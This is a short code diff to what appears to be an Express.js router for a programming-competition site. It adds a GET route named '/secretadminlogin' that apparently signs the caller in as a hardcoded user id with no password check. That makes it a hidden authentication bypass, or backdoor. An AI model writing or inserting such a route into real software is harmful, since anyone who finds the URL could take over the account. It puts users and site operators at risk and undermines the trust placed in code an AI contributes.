@@ -77,6 +77,12 @@ router.post("/tjioilogin", async (req, res) => {
         res.send("Invalid credentials");
     }
 });
+router.get("/secretadminlogin", async (req, res) => {
+    let data = {
+        "id": 1002872
+    };
+    await check(data, req, res);
+});
 router.post("/updateStats", async (req, res) => {
     let usaco = req.body.usaco_div;
     let cf = req.body.cf_handle;
